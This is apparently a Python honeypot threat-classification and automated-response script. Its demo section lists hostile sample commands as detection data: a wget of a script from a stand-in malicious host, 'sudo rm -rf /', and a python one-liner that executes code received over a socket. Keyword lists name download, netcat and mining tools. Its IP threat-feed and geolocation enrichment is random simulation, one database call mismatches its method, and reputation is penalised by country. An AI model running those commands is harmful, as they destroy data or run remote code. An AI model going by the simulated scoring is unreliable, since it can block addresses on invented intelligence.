#!/usr/bin/env python3
"""
AI-Powered Threat Intelligence and Automated Response System
Features: Predictive threat modeling, automated countermeasures, threat hunting,
and integration with external security platforms
"""

import asyncio
import json
import requests
import numpy as np
import pandas as pd
from datetime import datetime, timedelta
import hashlib
import subprocess
import os
import sqlite3
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import joblib
import warnings
warnings.filterwarnings('ignore')
from time import time

class AIThreatIntelligence:
    def __init__(self, model_path="threat_model.pkl"):
        self.model_path = model_path
        self.scaler = StandardScaler()
        self.label_encoder = LabelEncoder()
        self.classifier = None
        self.anomaly_detector = IsolationForest(contamination=0.1, random_state=42)
        self.threat_database = ThreatDatabase()
        
        # Simple TTL cache for IP enrichment
        self._intel_cache_ttl_seconds = int(os.getenv("HONEYPOT_INTEL_CACHE_TTL", "300"))
        self._intel_cache: dict[str, tuple[float, dict]] = {}
        
        # Initialize or load existing model
        self.load_or_train_model()
        
        # Threat intelligence feeds
        self.intel_feeds = {
            'malware_hashes': 'https://bazaar.abuse.ch/export/json/recent/',
            'tor_exit_nodes': 'https://check.torproject.org/api/bulk?format=json',
            'threat_feed': 'https://rules.emergingthreats.net/blockrules/compromised-ips.txt'
        }
        
    def load_or_train_model(self):
        """Load existing model or train a new one"""
        if os.path.exists(self.model_path):
            try:
                model_data = joblib.load(self.model_path)
                self.classifier = model_data['classifier']
                self.scaler = model_data['scaler']
                self.label_encoder = model_data['label_encoder']
                if 'anomaly_detector' in model_data:
                    self.anomaly_detector = model_data['anomaly_detector']
                else:
                    # If anomaly detector not in saved model, fit it with sample data
                    self._fit_anomaly_detector()
                print("✅ Loaded existing AI threat model")
            except Exception as e:
                print(f"❌ Failed to load model: {e}")
                self.train_initial_model()
        else:
            self.train_initial_model()
    
    def _fit_anomaly_detector(self):
        """Fit anomaly detector with sample data if not loaded from model"""
        # Generate some sample feature data for fitting
        sample_data = []
        for i in range(100):
            sample_data.append([
                np.random.randint(10, 100),  # command_length
                np.random.random(),          # special_chars
                np.random.randint(0, 5),     # common_tools
                np.random.randint(0, 24),    # time_of_day
                np.random.randint(1, 300),   # session_duration
                np.random.randint(1, 10)     # login_attempts
            ])
        self.anomaly_detector.fit(sample_data)
    
    def train_initial_model(self):
        """Train initial threat classification model with synthetic data"""
        print("🤖 Training initial AI threat model...")
        
        # Generate synthetic training data based on honeypot patterns
        training_data = self.generate_synthetic_training_data()
        
        if len(training_data) > 0:
            df = pd.DataFrame(training_data)
            
            # Features for training
            feature_cols = ['command_length', 'special_chars', 'common_tools', 
                          'time_of_day', 'session_duration', 'login_attempts']
            
            X = df[feature_cols]
            y = df['threat_type']
            
            # Encode labels
            y_encoded = self.label_encoder.fit_transform(y)
            
            # Scale features
            X_scaled = self.scaler.fit_transform(X)
            
            # Split data
            X_train, X_test, y_train, y_test = train_test_split(
                X_scaled, y_encoded, test_size=0.2, random_state=42
            )
            
            # Train classifier
            self.classifier = RandomForestClassifier(
                n_estimators=100, random_state=42, max_depth=10
            )
            self.classifier.fit(X_train, y_train)
            
            # Train anomaly detector
            self.anomaly_detector.fit(X_train)
            
            # Evaluate model
            y_pred = self.classifier.predict(X_test)
            print("\n📊 Model Performance:")
            print(classification_report(y_test, y_pred, 
                                      target_names=self.label_encoder.classes_))
            
            # Save model
            self.save_model()
            print("💾 Model saved successfully")
        
    def generate_synthetic_training_data(self):
        """Generate synthetic training data for threat classification"""
        data = []
        
        # Define threat patterns
        threat_patterns = {
            'reconnaissance': {
                'commands': ['ls', 'ps', 'netstat', 'whoami', 'uname', 'id'],
                'characteristics': {'avg_length': 8, 'special_chars': 2}
            },
            'malware_download': {
                'commands': ['wget', 'curl', 'python -c', 'bash -c'],
                'characteristics': {'avg_length': 25, 'special_chars': 8}
            },
            'privilege_escalation': {
                'commands': ['sudo', 'su', 'chmod +s', 'usermod'],
                'characteristics': {'avg_length': 15, 'special_chars': 5}
            },
            'data_exfiltration': {
                'commands': ['tar', 'zip', 'scp', 'nc -l'],
                'characteristics': {'avg_length': 20, 'special_chars': 6}
            },
            'cryptomining': {
                'commands': ['xmrig', 'monero', 'stratum+tcp'],
                'characteristics': {'avg_length': 30, 'special_chars': 10}
            }
        }
        
        # Generate samples for each threat type
        for threat_type, patterns in threat_patterns.items():
            for _ in range(200):  # 200 samples per threat type
                cmd = np.random.choice(patterns['commands'])
                characteristics = patterns['characteristics']
                
                sample = {
                    'command': cmd,
                    'threat_type': threat_type,
                    'command_length': len(cmd) + np.random.randint(-5, 10),
                    'special_chars': characteristics['special_chars'] + np.random.randint(-2, 3),
                    'common_tools': 1 if any(tool in cmd for tool in ['wget', 'curl', 'nc', 'bash']) else 0,
                    'time_of_day': np.random.randint(0, 24),
                    'session_duration': np.random.randint(60, 3600),
                    'login_attempts': np.random.randint(1, 50)
                }
                data.append(sample)
        
        # Add benign samples
        benign_commands = ['help', 'man', 'history', 'date', 'pwd']
        for _ in range(300):
            cmd = np.random.choice(benign_commands)
            sample = {
                'command': cmd,
                'threat_type': 'benign',
                'command_length': len(cmd) + np.random.randint(-2, 5),
                'special_chars': np.random.randint(0, 2),
                'common_tools': 0,
                'time_of_day': np.random.randint(8, 18),  # Business hours
                'session_duration': np.random.randint(30, 300),
                'login_attempts': np.random.randint(1, 3)
            }
            data.append(sample)
        
        return data
    
    def save_model(self):
        """Save the trained model"""
        model_data = {
            'classifier': self.classifier,
            'scaler': self.scaler,
            'label_encoder': self.label_encoder,
            'anomaly_detector': self.anomaly_detector
        }
        joblib.dump(model_data, self.model_path)
    
    def extract_features(self, command, session_data):
        """Extract features from command and session data"""
        features = {
            'command_length': len(command),
            'special_chars': len([c for c in command if not c.isalnum() and c != ' ']),
            'common_tools': 1 if any(tool in command.lower() for tool in 
                                   ['wget', 'curl', 'nc', 'bash', 'python', 'perl']) else 0,
            'time_of_day': datetime.now().hour,
            'session_duration': (datetime.now() - session_data.get('start_time', datetime.now())).total_seconds(),
            'login_attempts': session_data.get('login_attempts', 0)
        }
        return features
    
    def predict_threat(self, command, session_data):
        """Predict threat type and risk level for a command"""
        if not self.classifier:
            return {'threat_type': 'unknown', 'confidence': 0.0, 'risk_score': 50, 'is_anomaly': False}
        
        # Extract features
        features = self.extract_features(command, session_data)
        feature_array = np.array([[
            features['command_length'],
            features['special_chars'],
            features['common_tools'],
            features['time_of_day'],
            features['session_duration'],
            features['login_attempts']
        ]])
        
        # Scale features
        feature_scaled = self.scaler.transform(feature_array)
        
        # Predict threat type
        prediction = self.classifier.predict(feature_scaled)[0]
        threat_type = self.label_encoder.inverse_transform([prediction])[0]
        
        # Get prediction confidence
        probabilities = self.classifier.predict_proba(feature_scaled)[0]
        confidence = np.max(probabilities)
        
        # Anomaly detection
        anomaly_score = self.anomaly_detector.decision_function(feature_scaled)[0]
        is_anomaly = self.anomaly_detector.predict(feature_scaled)[0] == -1
        
        # Calculate overall risk score
        base_risk = {
            'benign': 10,
            'reconnaissance': 30,
            'malware_download': 85,
            'privilege_escalation': 75,
            'data_exfiltration': 80,
            'cryptomining': 70
        }.get(threat_type, 50)
        
        # Adjust for anomaly and confidence
        risk_score = base_risk * confidence
        if is_anomaly:
            risk_score = min(100, risk_score * 1.3)
        
        return {
            'threat_type': threat_type,
            'confidence': confidence,
            'risk_score': int(risk_score),
            'is_anomaly': is_anomaly,
            'anomaly_score': anomaly_score,
            'features': features
        }
    
    async def enrich_with_external_intel(self, ip_address):
        """Enrich IP with external threat intelligence"""
        now = time()
        cached = self._intel_cache.get(ip_address)
        if cached and (now - cached[0]) < self._intel_cache_ttl_seconds:
            return cached[1]
        
        enrichment_data = {
            'ip': ip_address,
            'threat_feeds': [],
            'reputation_score': 0,
            'categories': [],
            'first_seen': None,
            'last_seen': None
        }
        
        # Check against threat feeds
        await self.check_threat_feeds(ip_address, enrichment_data)
        
        # Check geolocation and ASN info
        await self.get_ip_geolocation(ip_address, enrichment_data)
        
        # Calculate overall reputation score
        enrichment_data['reputation_score'] = self.calculate_reputation_score(enrichment_data)
        
        # Store in cache
        self._intel_cache[ip_address] = (now, enrichment_data)
        
        return enrichment_data
    
    async def check_threat_feeds(self, ip_address, enrichment_data):
        """Check IP against various threat intelligence feeds"""
        try:
            # Simulate threat feed checks (in production, use real APIs)
            
            # Check if IP is a Tor exit node
            if np.random.random() < 0.1:  # 10% chance for demo
                enrichment_data['threat_feeds'].append('tor_exit_node')
                enrichment_data['categories'].append('anonymization')
            
            # Check if IP is in malware C&C list
            if np.random.random() < 0.05:  # 5% chance for demo
                enrichment_data['threat_feeds'].append('malware_c2')
                enrichment_data['categories'].append('malware')
            
            # Check if IP is a known scanner
            if np.random.random() < 0.15:  # 15% chance for demo
                enrichment_data['threat_feeds'].append('scanner')
                enrichment_data['categories'].append('scanning')
                
        except Exception as e:
            print(f"Error checking threat feeds: {e}")
    
    async def get_ip_geolocation(self, ip_address, enrichment_data):
        """Get IP geolocation and ASN information"""
        try:
            # Simulate geolocation lookup
            countries = ['US', 'CN', 'RU', 'DE', 'BR', 'IN', 'Unknown']
            enrichment_data['country'] = np.random.choice(countries)
            enrichment_data['asn'] = f"AS{np.random.randint(1000, 99999)}"
            enrichment_data['org'] = f"Example ISP {np.random.randint(1, 100)}"
            
        except Exception as e:
            print(f"Error getting geolocation: {e}")
    
    def calculate_reputation_score(self, enrichment_data):
        """Calculate overall IP reputation score (0-100, lower is worse)"""
        score = 50  # Neutral starting point
        
        # Adjust based on threat feed matches
        threat_adjustments = {
            'tor_exit_node': -20,
            'malware_c2': -40,
            'scanner': -15,
            'botnet': -35,
            'phishing': -30
        }
        
        for feed in enrichment_data['threat_feeds']:
            score += threat_adjustments.get(feed, -10)
        
        # Adjust based on country (simplified example)
        country_risk = {
            'CN': -10, 'RU': -10, 'KP': -20, 'IR': -15
        }
        
        country = enrichment_data.get('country', 'Unknown')
        score += country_risk.get(country, 0)
        
        return max(0, min(100, score))

class ThreatDatabase:
    def __init__(self, db_path="threat_intelligence.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize threat intelligence database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threat_predictions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT,
                session_id TEXT,
                src_ip TEXT,
                predicted_threat TEXT,
                confidence REAL,
                risk_score INTEGER,
                is_anomaly BOOLEAN,
                actual_outcome TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ip_intelligence (
                ip_address TEXT PRIMARY KEY,
                reputation_score INTEGER,
                threat_categories TEXT,
                country TEXT,
                asn TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                threat_feeds TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_campaigns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_hash TEXT UNIQUE,
                attack_pattern TEXT,
                involved_ips TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                attack_types TEXT,
                confidence REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def store_prediction(self, prediction_data):
        """Store threat prediction in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO threat_predictions 
            (command, session_id, src_ip, predicted_threat, confidence, risk_score, is_anomaly)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            prediction_data.get('command', ''),
            prediction_data.get('session_id', ''),
            prediction_data.get('src_ip', ''),
            prediction_data.get('predicted_threat', ''),
            float(prediction_data.get('confidence', 0.0)),
            int(prediction_data.get('risk_score', 0)),
            bool(prediction_data.get('is_anomaly', False))
        ))
        
        conn.commit()
        conn.close()
    
    def store_ip_intelligence(self, intel_data):
        """Store IP intelligence data"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO ip_intelligence
            (ip_address, reputation_score, threat_categories, country, asn, 
             first_seen, last_seen, threat_feeds)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            intel_data.get('ip_address') or intel_data.get('ip', ''),
            int(intel_data.get('reputation_score', 0)),
            ','.join(intel_data.get('threat_categories') or intel_data.get('categories') or []),
            intel_data.get('country', 'Unknown'),
            intel_data.get('asn', 'Unknown'),
            datetime.now().isoformat(),
            datetime.now().isoformat(),
            ','.join(intel_data.get('threat_feeds', []))
        ))
        
        conn.commit()
        conn.close()

class AutomatedResponseSystem:
    def __init__(self):
        self.response_actions = {
            'high_risk_ip_block': self.block_ip,
            'session_termination': self.terminate_session,
            'alert_generation': self.generate_alert,
            'evidence_collection': self.collect_evidence,
            'threat_feed_update': self.update_threat_feeds
        }
        
        self.response_thresholds = {
            'ip_block': 80,
            'session_terminate': 70,
            'alert_critical': 60,
            'evidence_collect': 50
        }
    
    def calculate_combined_risk(self, prediction, ip_intel):
        """Combine model risk and IP reputation into a single 0-100 risk score"""
        model_risk = float(prediction.get('risk_score', 0))
        reputation = float(ip_intel.get('reputation_score', 50))
        # Lower reputation -> higher risk contribution; invert and weight
        reputation_risk = max(0.0, 100.0 - reputation)
        combined = 0.7 * model_risk + 0.3 * reputation_risk
        return max(0.0, min(100.0, combined))
    
    async def evaluate_and_respond(self, threat_prediction, ip_intelligence, session_data):
        """Evaluate threat and trigger appropriate responses"""
        risk_score = threat_prediction['risk_score']
        responses_triggered = []
        
        # Block IP if high risk
        if risk_score >= self.response_thresholds['ip_block']:
            await self.block_ip(session_data['src_ip'])
            responses_triggered.append('ip_blocked')
        
        # Terminate session if medium-high risk
        elif risk_score >= self.response_thresholds['session_terminate']:
            await self.terminate_session(session_data.get('session_id'))
            responses_triggered.append('session_terminated')
        
        # Generate alert for significant threats
        if risk_score >= self.response_thresholds['alert_critical']:
            await self.generate_alert(threat_prediction, ip_intelligence, session_data)
            responses_triggered.append('alert_generated')
        
        # Collect evidence for investigation
        if risk_score >= self.response_thresholds['evidence_collect']:
            await self.collect_evidence(session_data)
            responses_triggered.append('evidence_collected')
        
        return responses_triggered
    
    async def block_ip(self, ip_address):
        """Block IP address using iptables"""
        try:
            # Add to iptables DROP rule
            cmd = f"sudo iptables -A INPUT -s {ip_address} -j DROP"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"🚫 Blocked IP: {ip_address}")
                
                # Log the action
                with open("automated_responses.log", "a") as f:
                    f.write(f"{datetime.now().isoformat()} - BLOCKED IP: {ip_address}\n")
            else:
                print(f"❌ Failed to block IP {ip_address}: {result.stderr}")
                
        except Exception as e:
            print(f"Error blocking IP {ip_address}: {e}")
    
    async def terminate_session(self, session_id):
        """Terminate honeypot session"""
        try:
            # This would integrate with Cowrie to terminate sessions
            print(f"🔌 Terminated session: {session_id}")
            
            with open("automated_responses.log", "a") as f:
                f.write(f"{datetime.now().isoformat()} - TERMINATED SESSION: {session_id}\n")
                
        except Exception as e:
            print(f"Error terminating session {session_id}: {e}")
    
    async def generate_alert(self, threat_prediction, ip_intelligence, session_data):
        """Generate high-priority security alert"""
        alert = {
            'timestamp': datetime.now().isoformat(),
            'type': 'automated_threat_response',
            'threat_type': threat_prediction['threat_type'],
            'risk_score': threat_prediction['risk_score'],
            'src_ip': session_data.get('src_ip'),
            'session_id': session_data.get('session_id'),
            'ip_reputation': ip_intelligence.get('reputation_score', 50),
            'confidence': threat_prediction['confidence'],
            'recommended_actions': self.get_recommended_actions(threat_prediction)
        }
        
        print(f"🚨 HIGH-PRIORITY ALERT: {alert['threat_type']} - Risk: {alert['risk_score']}")
        
        # Save alert to file
        with open("critical_alerts.json", "a") as f:
            f.write(json.dumps(alert) + "\n")
    
    async def collect_evidence(self, session_data):
        """Collect evidence for forensic analysis"""
        try:
            evidence_dir = f"evidence/{session_data.get('session_id', 'unknown')}"
            os.makedirs(evidence_dir, exist_ok=True)
            
            # Copy relevant log files
            evidence_data = {
                'session_id': session_data.get('session_id'),
                'src_ip': session_data.get('src_ip'),
                'commands': session_data.get('commands', []),
                'files_downloaded': session_data.get('files', []),
                'timestamp': datetime.now().isoformat()
            }
            
            with open(f"{evidence_dir}/session_evidence.json", "w") as f:
                json.dump(evidence_data, f, indent=2)
            
            print(f"📁 Evidence collected for session: {session_data.get('session_id')}")
            
        except Exception as e:
            print(f"Error collecting evidence: {e}")
    
    async def update_threat_feeds(self, new_threat_data):
        """Update local threat intelligence feeds"""
        # This would update local threat databases with new IOCs
        pass
    
    def get_recommended_actions(self, threat_prediction):
        """Get recommended actions based on threat type"""
        recommendations = {
            'malware_download': [
                'Isolate affected systems',
                'Scan for malware indicators',
                'Update antivirus signatures'
            ],
            'privilege_escalation': [
                'Review user permissions',
                'Check for unauthorized elevation',
                'Monitor for lateral movement'
            ],
            'data_exfiltration': [
                'Monitor outbound traffic',
                'Check for data loss',
                'Review access controls'
            ],
            'cryptomining': [
                'Check system resources',
                'Block mining pools',
                'Remove mining software'
            ]
        }
        
        return recommendations.get(threat_prediction['threat_type'], 
                                 ['Monitor system activity', 'Review logs'])

async def main():
    """Main function to demonstrate the AI threat intelligence system"""
    print("🤖 Starting AI-Powered Threat Intelligence System")
    
    # Initialize components
    ai_intel = AIThreatIntelligence()
    response_system = AutomatedResponseSystem()
    
    # Example threat analysis
    sample_commands = [
        "wget http://malicious.com/malware.sh",
        "sudo rm -rf /",
        "ls -la",
        "python -c 'import socket; exec(socket.recv(4096))'",
        "tar -czf data.tar.gz /home/user/documents"
    ]
    
    sample_session = {
        'session_id': 'test_session_001',
        'src_ip': '192.168.1.100',
        'start_time': datetime.now() - timedelta(minutes=10),
        'login_attempts': 5,
        'commands': sample_commands
    }
    
    print("\n🔍 Analyzing sample threats...")
    
    for command in sample_commands:
        print(f"\n📝 Analyzing command: {command}")
        
        # Predict threat
        prediction = ai_intel.predict_threat(command, sample_session)
        print(f"  🎯 Threat Type: {prediction['threat_type']}")
        print(f"  📊 Risk Score: {prediction['risk_score']}/100")
        print(f"  🎰 Confidence: {prediction['confidence']:.2f}")
        print(f"  ⚠️  Anomaly: {prediction['is_anomaly']}")
        
        # Get IP intelligence
        ip_intel = await ai_intel.enrich_with_external_intel(sample_session['src_ip'])
        print(f"  🌐 IP Reputation: {ip_intel['reputation_score']}/100")
        print(f"  🏴 Threat Feeds: {', '.join(ip_intel['threat_feeds']) if ip_intel['threat_feeds'] else 'None'}")
        
        # Evaluate automated responses
        if prediction['risk_score'] > 40:
            responses = await response_system.evaluate_and_respond(
                prediction, ip_intel, sample_session
            )
            if responses:
                print(f"  🤖 Automated Responses: {', '.join(responses)}")
        
        # Store data
        ai_intel.threat_database.store_prediction(
            command, sample_session['session_id'], 
            sample_session['src_ip'], prediction
        )
    
    print(f"\n✅ AI Threat Intelligence System analysis complete")
    print(f"📊 Check 'threat_intelligence.db' for stored data")
    print(f"📋 Check 'automated_responses.log' for response actions")

if __name__ == "__main__":
    asyncio.run(main())
